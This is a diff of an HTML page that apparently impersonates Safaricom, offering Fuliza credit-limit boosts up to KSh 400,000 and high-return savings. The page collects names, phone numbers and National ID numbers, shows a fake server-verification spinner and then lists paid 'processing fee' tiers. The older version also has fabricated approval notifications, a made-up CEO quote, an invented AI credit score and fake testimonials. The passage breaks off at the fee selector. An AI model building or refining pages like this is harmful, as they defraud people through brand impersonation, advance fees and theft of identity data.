@@ -3,820 +3,426 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safaricom Services - Fuliza & Financial Services</title>
+    <title>Safaricom Financial Services | Official Portal</title>
     <style>
         :root {
-            --primary: #00a651;
-            --primary-dark: #008541;
-            --primary-light: #e6f9ee;
-            --accent-blue: #0275d8;
-            --ai-purple: #6f42c1;
-            --ai-glow: rgba(111, 66, 193, 0.15);
-            --text-main: #1f2937;
-            --text-muted: #6b7280;
-            --bg-canvas: #f8fafc;
+            --safaricom-green: #00a651;
+            --safaricom-dark-green: #007a3b;
+            --safaricom-red: #e11b22;
+            --text-dark: #1e293b;
+            --text-muted: #64748b;
+            --bg-light: #f8fafc;
             --surface: #ffffff;
             --border: #e2e8f0;
-            --radius: 12px;
-            --shadow-sm: 0 1px 3px rgba(0,0,0,0.05);
-            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
-            --danger: #dc2626;
+            --radius-sm: 8px;
+            --radius-md: 16px;
+            --shadow: 0 4px 20px -2px rgba(0, 0, 0, 0.05);
         }
 
-        body.dark-mode {
-            --bg-canvas: #0f172a;
-            --surface: #1e293b;
-            --text-main: #f8fafc;
-            --text-muted: #94a3b8;
-            --border: #334155;
-            --primary-light: #064e3b;
-            --ai-glow: rgba(111, 66, 193, 0.3);
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; }
+        body { background-color: var(--bg-light); color: var(--text-dark); display: flex; flex-direction: column; min-height: 100vh; font-size: 14px; }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background: var(--bg-canvas); color: var(--text-main); overflow-x: hidden; position: relative; min-height: 100vh; padding-bottom: 80px; transition: background 0.3s ease; }
+        /* Top Brand Header */
+        .brand-header { background: #ffffff; border-bottom: 1px solid var(--border); padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; box-shadow: var(--shadow); }
+        .logo-container { display: flex; align-items: center; gap: 12px; }
+        .brand-logo { font-size: 22px; font-weight: 800; color: var(--safaricom-green); letter-spacing: -0.5px; display: flex; align-items: center; gap: 6px; }
+        .brand-badge { background: #e6f7ed; color: var(--safaricom-dark-green); font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 20px; border: 1px solid #b3e6c8; }
         
-        .safaricom-topbar { background: #008541; color: #fff; text-align: center; font-size: 10px; padding: 6px; font-weight: 600; letter-spacing: .5px; }
+        .header-nav { display: flex; gap: 20px; align-items: center; font-size: 13px; font-weight: 600; color: var(--text-muted); }
+        .header-nav a { text-decoration: none; color: inherit; transition: color 0.2s; }
+        .header-nav a:hover { color: var(--safaricom-green); }
 
-        .bg-watermark { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 0; overflow: hidden; }
-        .bg-logo {
-            position: absolute; width: 120px; height: 120px; opacity: 0.03;
-            background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Safaricom_logo.svg/1200px-Safaricom_logo.svg.png') no-repeat center center / contain;
-            animation: floatLogo 20s linear infinite;
-        }
-        .bg-logo:nth-child(1) { top: 10%; left: -50px; animation-duration: 24s; }
-        .bg-logo:nth-child(2) { top: 45%; right: -50px; animation-duration: 18s; animation-delay: 2s; }
-        .bg-logo:nth-child(3) { top: 78%; left: -50px; animation-duration: 22s; animation-delay: 5s; }
+        /* Step Scaffolding */
+        .step-tracker { background: #ffffff; border-bottom: 1px solid var(--border); padding: 14px 20px; }
+        .step-tracker-inner { max-width: 600px; margin: 0 auto; display: flex; justify-content: space-between; position: relative; }
+        .step-node { font-size: 12px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; display: flex; align-items: center; gap: 6px; }
+        .step-node.active { color: var(--safaricom-green); }
+        .step-num { width: 22px; height: 22px; border-radius: 50%; background: #e2e8f0; color: var(--text-muted); display: inline-flex; align-items: center; justify-content: center; font-size: 11px; }
+        .step-node.active .step-num { background: var(--safaricom-green); color: #ffffff; }
 
-        @keyframes floatLogo {
-            0% { transform: translateX(-100px) translateY(0) rotate(0deg); }
-            50% { transform: translateX(50vw) translateY(-30px) rotate(180deg); }
-            100% { transform: translateX(110vw) translateY(0) rotate(360deg); }
-        }
-
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(6px);
-            z-index: 999; display: flex; align-items: center; justify-content: center; padding: 16px;
-        }
-        .modal-content {
-            background: var(--surface); border-radius: var(--radius); max-width: 450px; width: 100%;
-            padding: 24px; box-shadow: var(--shadow-md); text-align: center; animation: modalPop 0.3s ease; border: 1px solid var(--border);
-        }
-        @keyframes modalPop { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-
-        .header { background: var(--primary); color: white; padding: 12px 16px; text-align: center; font-size: 15px; font-weight: 700; box-shadow: var(--shadow-sm); display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
-        .header-title { display: flex; align-items: center; gap: 8px; }
-        .header-logo { width: 24px; height: 24px; background: #fff; border-radius: 50%; color: var(--primary); font-weight: 800; font-size: 13px; display: flex; align-items: center; justify-content: center; }
-        .theme-btn { background: rgba(255,255,255,0.2); border: none; color: white; padding: 4px 10px; border-radius: 12px; font-size: 11px; cursor: pointer; transition: background 0.2s; }
-
-        .support-banner { background: #004d25; color: #ffffff; padding: 6px 12px; font-size: 11px; text-align: center; font-weight: 600; position: sticky; top: 48px; z-index: 99; letter-spacing: 0.3px; }
-
-        .user-profile-bar { background: var(--surface); border-bottom: 1px solid var(--border); padding: 10px 16px; display: flex; align-items: center; gap: 12px; justify-content: space-between; }
-        .user-info { display: flex; align-items: center; gap: 10px; }
-        .avatar { width: 38px; height: 38px; border-radius: 50%; background: var(--primary-light); color: var(--primary-dark); font-weight: 700; display: flex; align-items: center; justify-content: center; border: 2px solid var(--primary); font-size: 14px; }
-        .greeting-text { font-size: 13px; font-weight: 600; color: var(--text-main); }
-        .ai-chip { background: var(--ai-purple); color: white; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 10px; display: inline-flex; align-items: center; gap: 4px; }
-
-        .step-progress-bar { background: var(--surface); border-bottom: 1px solid var(--border); padding: 8px 15px; display: flex; justify-content: space-between; position: relative; z-index: 90; }
-        .step-node { font-size: 11px; font-weight: 600; color: #aaa; text-transform: uppercase; letter-spacing: 0.5px; flex: 1; text-align: center; }
-        .step-node.active { color: var(--primary); font-weight: 700; }
-
-        .screen { display: none; padding-bottom: 20px; position: relative; z-index: 5; }
-        .screen.active { display: block; animation: slideFade 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
-        @keyframes slideFade { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+        /* Layout Container */
+        .main-container { flex: 1; max-width: 580px; width: 100%; margin: 24px auto; padding: 0 16px; }
         
-        .container { padding: 16px; max-width: 540px; margin: 0 auto; }
-        .card { background: var(--surface); border-radius: var(--radius); padding: 20px; margin-bottom: 14px; box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
-
-        .ai-card { background: linear-gradient(135deg, var(--surface) 0%, var(--ai-glow) 100%); border: 1px solid var(--ai-purple); border-radius: var(--radius); padding: 14px; margin-bottom: 14px; }
-        .ai-card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
-        .ai-card-title { font-size: 12px; font-weight: 700; color: var(--ai-purple); display: flex; align-items: center; gap: 6px; }
-        .ai-score-badge { font-size: 14px; font-weight: 800; color: var(--primary); background: var(--primary-light); padding: 2px 8px; border-radius: 6px; border: 1px solid var(--primary); }
-
-        /* CEO Quote Card Styling */
-        .ceo-card { display: flex; align-items: center; gap: 12px; background: linear-gradient(135deg, #f0fdf4 0%, #ffffff 100%); border-left: 4px solid var(--primary); border-radius: var(--radius); padding: 12px; margin-bottom: 14px; box-shadow: var(--shadow-sm); }
-        .ceo-img { width: 65px; height: 65px; border-radius: 50%; object-fit: cover; border: 2px solid var(--primary); }
-        .ceo-info { flex: 1; text-align: left; }
-        .ceo-quote { font-size: 11px; font-style: italic; color: var(--text-main); line-height: 1.3; }
-        .ceo-name { font-size: 11px; font-weight: 700; color: var(--primary-dark); margin-top: 4px; }
-
-        /* Dynamic Trust Banner */
-        .trust-banner { display: flex; justify-content: space-around; align-items: center; background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 10px; margin-bottom: 14px; font-size: 10px; font-weight: 600; color: var(--text-muted); }
-        .trust-item { display: flex; align-items: center; gap: 4px; }
-
-        .portal-choice-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 8px; }
-        .choice-card { background: var(--surface); border: 2px solid var(--border); border-radius: var(--radius); padding: 14px 10px; text-align: center; cursor: pointer; transition: all 0.3s ease; }
-        .choice-card:hover, .choice-card.selected { border-color: var(--primary); background: var(--primary-light); transform: translateY(-2px); }
-        .choice-card h3 { font-size: 14px; color: var(--primary); margin-bottom: 4px; }
-        .choice-card p { font-size: 10px; color: var(--text-muted); line-height: 1.3; }
-
-        .testimonial-wrapper { height: 120px; overflow: hidden; margin-top: 15px; border-radius: 10px; background: var(--surface); border: 1px solid var(--border); }
-        .testimonial-track { display: flex; flex-direction: column; animation: scrollUp 30s linear infinite; }
-        @keyframes scrollUp { 0% { transform: translateY(0); } 100% { transform: translateY(-50%); } }
-        .testimonial { background: var(--primary-light); padding: 10px; margin-bottom: 8px; border-radius: 8px; border-left: 4px solid var(--primary); text-align: left; }
-        .testimonial b { color: var(--primary); font-size: 12px; }
-        .testimonial p { font-size: 11px; color: var(--text-main); text-align: left; margin: 3px 0 0 0; }
-
-        h2 { font-size: 16px; text-align: center; margin-bottom: 12px; color: var(--text-main); font-weight: 700; }
+        .card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius-md); padding: 24px; box-shadow: var(--shadow); margin-bottom: 16px; }
         
-        .btn { 
-            width: 100%; background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%); color: white; 
-            border: none; padding: 15px; border-radius: 24px; font-size: 14px; font-weight: 700; 
-            cursor: pointer; display: block; text-align: center; box-shadow: 0 4px 12px rgba(0, 166, 81, 0.3);
-            transition: all 0.3s ease; outline: none; letter-spacing: 0.3px;
+        /* Interactive Animated Pulse Buttons */
+        .btn-animated { 
+            width: 100%; 
+            background: linear-gradient(135deg, var(--safaricom-green) 0%, var(--safaricom-dark-green) 100%); 
+            color: #ffffff; 
+            border: none; 
+            padding: 16px 24px; 
+            border-radius: 30px; 
+            font-size: 15px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px;
+            box-shadow: 0 4px 14px rgba(0, 166, 81, 0.35); 
+            animation: pulse-glow 2.5s infinite ease-in-out; 
+            transition: transform 0.2s, filter 0.2s;
         }
-        .btn:hover { transform: translateY(-1px); filter: brightness(1.05); }
-        .btn:disabled { background: #cccccc !important; box-shadow: none; cursor: not-allowed; opacity: 0.7; }
+        .btn-animated:hover { transform: translateY(-2px); filter: brightness(1.05); }
+        .btn-animated:disabled { background: #cbd5e1 !important; animation: none; box-shadow: none; cursor: not-allowed; }
 
-        .form-group { margin-bottom: 14px; text-align: left; position: relative; }
-        .form-group label { display: block; font-size: 12px; color: var(--text-main); margin-bottom: 6px; font-weight: 600; }
-        
-        .input-wrapper { position: relative; display: flex; align-items: center; }
-        .form-group input, .form-group select { width: 100%; padding: 11px 36px 11px 12px; border: 1px solid var(--border); border-radius: 8px; font-size: 13px; background: var(--surface); color: var(--text-main); }
-        
-        .validation-icon { position: absolute; right: 12px; top: 11px; font-size: 16px; font-weight: 700; display: none; }
-        .validation-icon.show { display: block; }
-        .validation-icon.valid { color: var(--primary); }
-        .validation-icon.invalid { color: var(--danger); }
+        /* Secondary Action Buttons (Back to Menu, Cancel, Retries) */
+        .btn-secondary {
+            width: 100%;
+            background: #ffffff;
+            color: var(--text-dark);
+            border: 1px solid var(--border);
+            padding: 14px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 10px;
+            transition: all 0.2s ease;
+        }
+        .btn-secondary:hover { background: #f1f5f9; border-color: #cbd5e1; }
 
-        .error { color: var(--danger); font-size: 11px; margin-top: 4px; display: none; font-weight: 500; }
+        @keyframes pulse-glow {
+            0% { box-shadow: 0 0 0 0 rgba(0, 166, 81, 0.4); }
+            70% { box-shadow: 0 0 0 12px rgba(0, 166, 81, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 166, 81, 0); }
+        }
 
-        .limits-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 14px 0; }
-        .limit-option { background: var(--surface); border: 1.5px solid var(--border); border-radius: 10px; padding: 12px 8px; text-align: center; cursor: pointer; }
-        .limit-option.selected { border-color: var(--primary); background: var(--primary-light); font-weight: bold; }
-        .limit-option h3 { font-size: 15px; color: var(--text-main); }
-        .limit-option p { font-size: 10px; color: var(--primary); margin-top: 2px; }
+        /* Avatar Container Styles */
+        .avatar-box { display: flex; align-items: center; gap: 16px; background: #f1f5f9; padding: 16px; border-radius: var(--radius-sm); border-left: 4px solid var(--safaricom-green); }
+        .avatar-svg { width: 60px; height: 60px; border-radius: 50%; background: #ffffff; border: 2px solid var(--safaricom-green); padding: 4px; }
 
-        .summary-box { background: var(--primary-light); border: 1px solid var(--border); border-radius: 10px; padding: 12px; display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; }
-        .summary-box span:last-child { color: var(--primary); font-weight: 700; }
+        /* Dynamic Options */
+        .portal-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 16px 0; }
+        .portal-option { border: 2px solid var(--border); border-radius: var(--radius-sm); padding: 16px; cursor: pointer; transition: all 0.2s; }
+        .portal-option.selected { border-color: var(--safaricom-green); background: #f0fdf4; }
 
-        .spinner { border: 3px solid var(--primary-light); border-top: 3px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+        .form-group { margin-bottom: 16px; text-align: left; }
+        .form-group label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; }
+        .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid var(--border); border-radius: var(--radius-sm); font-size: 14px; outline: none; }
+        .form-group input:focus { border-color: var(--safaricom-green); }
+
+        /* Guarantee Note Box */
+        .guarantee-note { background: #fff8f8; border: 1px solid #fecaca; border-left: 4px solid var(--safaricom-red); padding: 14px; border-radius: var(--radius-sm); font-size: 12px; color: #7f1d1d; line-height: 1.5; margin: 16px 0; }
+
+        .screens { display: none; }
+        .screens.active { display: block; }
+
+        /* Professional Footer */
+        footer { background: #0f172a; color: #94a3b8; padding: 40px 20px 20px; margin-top: auto; font-size: 12px; border-top: 1px solid var(--border); }
+        .footer-inner { max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 30px; margin-bottom: 30px; text-align: left; }
+        .footer-col h4 { color: #ffffff; font-size: 14px; margin-bottom: 12px; }
+        .footer-col ul { list-style: none; }
+        .footer-col ul li { margin-bottom: 8px; }
+        .footer-col ul li a { color: #94a3b8; text-decoration: none; transition: color 0.2s; }
+        .footer-col ul li a:hover { color: #ffffff; }
+        .footer-bottom { max-width: 1000px; margin: 0 auto; padding-top: 20px; border-top: 1px solid #334155; text-align: center; display: flex; flex-direction: column; gap: 12px; align-items: center; }
+        .trust-badges { display: flex; gap: 16px; font-weight: 600; color: #cbd5e1; font-size: 11px; }
+
+        .spinner { border: 3px solid #e2e8f0; border-top: 3px solid var(--safaricom-green); border-radius: 50%; width: 36px; height: 36px; animation: spin 0.8s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .top-notif { position: fixed; top: 0; left: 0; right: 0; background: var(--surface); padding: 10px 15px; display: none; align-items: center; gap: 10px; box-shadow: 0 2px 10px rgba(0,0,0,.1); z-index: 9999; border-bottom: 3px solid var(--primary); }
-        .top-notif .notif-avatar { width: 32px; height: 32px; font-size: 16px; background: var(--primary); color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
-
-        .zuri-chat-toggle {
-            position: fixed; bottom: 70px; right: 20px; z-index: 998;
-            background: linear-gradient(135deg, var(--ai-purple), #4c1d95);
-            color: white; border: none; padding: 12px 18px; border-radius: 30px;
-            font-size: 13px; font-weight: 700; cursor: pointer;
-            box-shadow: 0 4px 16px rgba(111, 66, 193, 0.4);
-            display: flex; align-items: center; gap: 8px;
-        }
-
-        .zuri-chat-box {
-            position: fixed; bottom: 80px; right: 20px; width: 330px; height: 420px;
-            background: var(--surface); border: 1px solid var(--border); border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2); z-index: 999;
-            display: none; flex-direction: column; overflow: hidden;
-        }
-        .zuri-chat-header {
-            background: linear-gradient(135deg, var(--ai-purple), #4c1d95); color: white;
-            padding: 12px 16px; font-weight: 700; font-size: 13px;
-            display: flex; justify-content: space-between; align-items: center;
-        }
-        .zuri-chat-close { background: none; border: none; color: white; font-size: 16px; cursor: pointer; }
-        .zuri-messages { flex: 1; padding: 12px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; font-size: 12px; }
-        .msg { max-width: 85%; padding: 8px 12px; border-radius: 12px; line-height: 1.4; }
-        .msg.bot { background: var(--primary-light); color: var(--text-main); align-self: flex-start; }
-        .msg.user { background: var(--primary); color: white; align-self: flex-end; }
-        .zuri-chat-input { display: flex; padding: 8px; border-top: 1px solid var(--border); background: var(--surface); gap: 6px; }
-        .zuri-chat-input input { flex: 1; border: 1px solid var(--border); border-radius: 18px; padding: 6px 12px; font-size: 12px; background: var(--bg-canvas); color: var(--text-main); }
-        .zuri-chat-input button { background: var(--ai-purple); border: none; color: white; border-radius: 50%; width: 30px; height: 30px; cursor: pointer; }
-
-        #finapi-container button {
-            background: var(--primary) !important;
-            border-radius: 25px !important;
-            font-weight: 700 !important;
-            font-size: 15px !important;
-            padding: 15px !important;
-            width: 100% !important;
-            border: none !important;
-            color: white !important;
-            box-shadow: 0 4px 12px rgba(0, 166, 81, 0.3) !important;
-            cursor: pointer !important;
-        }
-        #finapi-container button:hover {
-            background: var(--primary-dark) !important;
-        }
-        
-        .footer { background: #0f172a; color: #94a3b8; padding: 12px 16px; font-size: 10px; position: fixed; bottom: 0; width: 100%; z-index: 100; border-top: 1px solid #1e293b; text-align: center; }
     </style>
 </head>
 <body>
 
-<div class="safaricom-topbar">SAFARICOM PLC | CELEBRATING 25 YEARS OF TRANSFORMING LIVES IN KENYA</div>
+    <!-- Header Navigation -->
+    <header class="brand-header">
+        <div class="logo-container">
+            <div class="brand-logo">
+                <span style="color:var(--safaricom-red);">S</span>Safaricom
+            </div>
+            <span class="brand-badge">Financial Services</span>
+        </div>
+        <nav class="header-nav">
+            <a href="#" onclick="resetToMainMenu()">Main Menu</a>
+            <a href="#">Personal</a>
+            <a href="#">Business</a>
+            <a href="#">M-PESA</a>
+            <a href="#">Support</a>
+        </nav>
+    </header>
 
-<div id="topNotif" class="top-notif">
-    <div class="notif-avatar">✓</div>
-    <div>
-        <div class="text"><b id="notPhone">070167***29</b> approved for Ksh <b id="notAmt">45,715</b></div>
-        <div class="time" id="notTime" style="font-size:10px; color:var(--text-muted);">2 mins ago</div>
+    <!-- Step Scaffolding Bar -->
+    <div class="step-tracker">
+        <div class="step-tracker-inner">
+            <div class="step-node active" id="st1"><span class="step-num">1</span> Service</div>
+            <div class="step-node" id="st2"><span class="step-num">2</span> Verify</div>
+            <div class="step-node" id="st3"><span class="step-num">3</span> Configure</div>
+            <div class="step-node" id="st4"><span class="step-num">4</span> Checkout</div>
+        </div>
     </div>
-</div>
 
-<button class="zuri-chat-toggle" id="zuriChat" onclick="toggleZuriChat()">
-    <span>💬</span> <b>Chat with Zuri AI</b>
-</button>
-
-<div class="zuri-chat-box" id="zuriChatBox">
-    <div class="zuri-chat-header">
-        <span>🤖 Zuri AI Assistant</span>
-        <button class="zuri-chat-close" onclick="toggleZuriChat()">✕</button>
-    </div>
-    <div class="zuri-messages" id="zuriMessages"></div>
-    <form class="zuri-chat-input" onsubmit="handleZuriSend(event)">
-        <input type="text" id="zuriInput" placeholder="Ask Zuri AI..." autocomplete="off">
-        <button type="submit">➔</button>
-    </form>
-</div>
-
-<div class="modal-overlay" id="welcomeModal">
-    <div class="modal-content">
-        <h2 style="color:var(--primary); font-size:18px;">Safaricom Official Portal</h2>
-        <p style="font-size:12px; color:var(--text-muted); margin: 8px 0 16px;">Transforming lives through instant financial freedom & AI-driven wealth growth.</p>
+    <!-- Main Card Body -->
+    <main class="main-container">
         
-        <div class="portal-choice-grid">
-            <div class="choice-card selected" id="modalChoiceFuliza" onclick="selectInitialService('fuliza')">
-                <h3>📈 Fuliza Boost</h3>
-                <p>Instant Limit Upgrade up to KSh 400,000</p>
-            </div>
-            <div class="choice-card" id="modalChoiceMMF" onclick="selectInitialService('mmf')">
-                <h3>💰 Zidi MMF</h3>
-                <p>High Return Zuri AI Growth Savings</p>
-            </div>
-        </div>
-        
-        <button class="btn" style="margin-top:16px;" onclick="proceedFromModal()">Proceed to Verification</button>
-    </div>
-</div>
-
-<div class="bg-watermark">
-    <div class="bg-logo"></div>
-    <div class="bg-logo"></div>
-    <div class="bg-logo"></div>
-</div>
-
-<div class="header">
-    <div class="header-title">
-        <div class="header-logo">S</div> Safaricom Official Financial Services
-    </div>
-    <button class="theme-btn" onclick="toggleTheme()">🌙 Theme</button>
-</div>
-
-<div class="support-banner">
-    📞 Queries or assistance? Contact Safaricom via <a href="tel:0722000000" style="color: #85edd1; text-decoration: none; font-weight: 700;">0722000000</a>
-</div>
-
-<div class="user-profile-bar">
-    <div class="user-info">
-        <div class="avatar" id="userAvatar">S</div>
-        <!-- Real-time Time-of-Day Dynamic Greeting -->
-        <div class="greeting-text" id="userGreeting">Hi 👋 Guest</div>
-    </div>
-    <div class="ai-chip">🤖 Zuri AI Active</div>
-</div>
-
-<div class="step-progress-bar" id="stepBar">
-    <div class="step-node active" id="node1">1. Select</div>
-    <div class="step-node" id="node2">2. Verify</div>
-    <div class="step-node" id="node3">3. Amount</div>
-    <div class="step-node" id="node4">4. Payment</div>
-</div>
-
-<!-- STEP 1: HOME PAGE -->
-<div id="s1" class="screen active">
-    <div class="container">
-        
-        <!-- CEO Message Section -->
-        <div class="ceo-card">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Peter_Ndegwa_Safaricom_CEO.jpg" alt="Peter Ndegwa CEO Safaricom" class="ceo-img" onerror="this.src='https://via.placeholder.com/65/00a651/ffffff?text=CEO'">
-            <div class="ceo-info">
-                <div class="ceo-quote">"Our mission is to empower every Kenyan family and business with instant, accessible credit and guaranteed financial prosperity."</div>
-                <div class="ceo-name">Peter Ndegwa — CEO, Safaricom PLC</div>
-            </div>
-        </div>
-
-        <!-- Trust Features Bar -->
-        <div class="trust-banner">
-            <div class="trust-item">🔒 256-Bit Encrypted</div>
-            <div class="trust-item">⚡ 30-Sec Approval</div>
-            <div class="trust-item">🛡️ Safaricom Guarantee</div>
-        </div>
-
-        <div class="ai-card">
-            <div class="ai-card-header">
-                <div class="ai-card-title">🤖 Zuri AI Credit Assessor</div>
-                <div class="ai-score-badge">Score: 98.4%</div>
-            </div>
-            <p style="font-size:11px; color:var(--text-muted); line-height:1.4;">
-                Unlock unlimited financial power! Zuri AI instantly scans your Safaricom line history to auto-approve high Fuliza limits and maximum Zidi MMF returns in seconds.
-            </p>
-        </div>
-
-        <div class="card">
-            <h2>Select Requested Service</h2>
-            <div class="portal-choice-grid">
-                <div class="choice-card selected" id="btnChoiceFuliza" onclick="setService('fuliza')">
-                    <h3>📈 Fuliza Boost</h3>
-                    <p>Upgrade limit up to KSh 400,000</p>
-                </div>
-                <div class="choice-card" id="btnChoiceMMF" onclick="setService('mmf')">
-                    <h3>💰 Zidi MMF Shares</h3>
-                    <p>Zuri AI Compounded Growth</p>
-                </div>
-            </div>
-        </div>
-
-        <div class="card">
-            <h2>Customer Reviews & Approvals</h2>
-            <div class="testimonial-wrapper">
-                <div class="testimonial-track" id="testimonialTrack"></div>
-            </div>
-            <button class="btn" style="margin-top:15px;" onclick="goToScreen(2)">Proceed to Verification</button>
-        </div>
-    </div>
-</div>
-
-<!-- STEP 2: USER DETAILS ENTRY -->
-<div id="s2" class="screen">
-    <div class="container">
-        <div class="card">
-            <h2>Verify Your Details</h2>
-            <form id="form1">
-                <div class="form-group">
-                    <label>Surname *</label>
-                    <div class="input-wrapper">
-                        <input type="text" id="surname" placeholder="Example: Doe" required>
-                        <span class="validation-icon" id="surnameIcon">✓</span>
+        <!-- STEP 1: SERVICE SELECTION -->
+        <div id="screen1" class="screens active">
+            <div class="card">
+                <h2 style="font-size: 18px; margin-bottom: 8px;">Select Service Option</h2>
+                <p style="color: var(--text-muted); font-size: 13px;">Choose the financial service you wish to configure for your active line.</p>
+                
+                <div class="portal-grid">
+                    <div class="portal-option selected" id="optFuliza" onclick="setPortalService('fuliza')">
+                        <h3 style="color: var(--safaricom-green); font-size: 15px;">Fuliza Limit Boost</h3>
+                        <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Request line limit upgrades up to KSh 400,000</p>
+                    </div>
+                    <div class="portal-option" id="optMMF" onclick="setPortalService('mmf')">
+                        <h3 style="color: var(--safaricom-green); font-size: 15px;">Zidi MMF Account</h3>
+                        <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">High-yield compound growth savings portfolio</p>
                     </div>
                 </div>
 
-                <div class="form-group">
-                    <label>Middle Name (Optional)</label>
-                    <div class="input-wrapper">
-                        <input type="text" id="middlename" placeholder="Example: Kamau">
-                    </div>
-                </div>
+                <button class="btn-animated" onclick="switchScreen(2)">
+                    Proceed to Line Verification &rarr;
+                </button>
+            </div>
+        </div>
 
-                <div class="form-group">
-                    <label>Last Name *</label>
-                    <div class="input-wrapper">
-                        <input type="text" id="lastname" placeholder="Example: John" required>
-                        <span class="validation-icon" id="lastnameIcon">✓</span>
+        <!-- STEP 2: USER VERIFICATION FORM -->
+        <div id="screen2" class="screens">
+            <div class="card">
+                <h2 style="font-size: 18px; margin-bottom: 12px;">Verify Safaricom Line</h2>
+                <form id="verifyForm" onsubmit="handleVerification(event)">
+                    <div class="form-group">
+                        <label>Surname *</label>
+                        <input type="text" id="surname" placeholder="e.g. Kamau" required oninput="updateProfileAvatar()">
                     </div>
-                </div>
-
-                <div class="form-group">
-                    <label>Safaricom Phone Number *</label>
-                    <div class="input-wrapper">
+                    <div class="form-group">
+                        <label>First / Other Name *</label>
+                        <input type="text" id="firstname" placeholder="e.g. John" required oninput="updateProfileAvatar()">
+                    </div>
+                    <div class="form-group">
+                        <label>Safaricom Phone Number *</label>
                         <input type="tel" id="phone" placeholder="07XXXXXXXX or 01XXXXXXXX" required>
-                        <span class="validation-icon" id="phoneIcon">✓</span>
                     </div>
-                    <div class="error" id="phoneError"></div>
-                </div>
+                    <div class="form-group">
+                        <label>National ID Number *</label>
+                        <input type="text" id="idnum" placeholder="Enter ID Number" required>
+                    </div>
+                    <button type="submit" class="btn-animated">Verify Subscriber Details</button>
+                    <button type="button" class="btn-secondary" onclick="resetToMainMenu()">&larr; Back to Main Menu</button>
+                </form>
+            </div>
+        </div>
 
+        <!-- LOADING INTERMEDIARY -->
+        <div id="screen_load" class="screens">
+            <div class="card" style="text-align: center; padding: 40px 20px;">
+                <div class="spinner"></div>
+                <h3 style="font-size: 16px; margin-top: 12px;">Validating Account Line Details...</h3>
+                <p style="color: var(--text-muted); font-size: 12px; margin-top: 6px;">Communicating securely with Safaricom Core Servers.</p>
+            </div>
+        </div>
+
+        <!-- STEP 3: SELECTION & CUSTOM GUARANTEE NOTE -->
+        <div id="screen3" class="screens">
+            <!-- Dynamic Avatar Dashboard Box -->
+            <div class="card" style="padding: 16px;">
+                <div class="avatar-box">
+                    <svg class="avatar-svg" viewBox="0 0 100 100">
+                        <circle cx="50" cy="50" r="48" fill="#e2e8f0"/>
+                        <circle cx="50" cy="38" r="20" fill="#94a3b8"/>
+                        <path d="M 20 82 C 20 62, 32 55, 50 55 C 68 55, 80 62, 80 82 Z" fill="#94a3b8"/>
+                    </svg>
+                    <div>
+                        <div style="font-size: 11px; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">Verified Line Account</div>
+                        <h3 id="displayProfileName" style="font-size: 16px; color: var(--text-dark);">John Kamau</h3>
+                        <div id="displayProfilePhone" style="font-size: 12px; color: var(--safaricom-dark-green); font-weight: 600;">2547XXXXXXXX</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2 style="font-size: 16px; margin-bottom: 12px;" id="configTitle">Select Approved Boost Allocation</h2>
+                
                 <div class="form-group">
-                    <label>Identification Document Type</label>
-                    <select id="idType">
-                        <option value="national_id">National ID Card (7 - 8 Digits)</option>
-                        <option value="huduma">Huduma Namba (9 Digits)</option>
-                        <option value="military">KDF / Service ID (6 - 8 Digits)</option>
-                        <option value="passport">Kenyan Passport (2 Letters + 6 Digits)</option>
+                    <label>Select Limit Increase tier</label>
+                    <select id="feeSelect">
+                        <option value="200">KSh 5,000 Limit Boost (Processing Fee: KSh 200)</option>
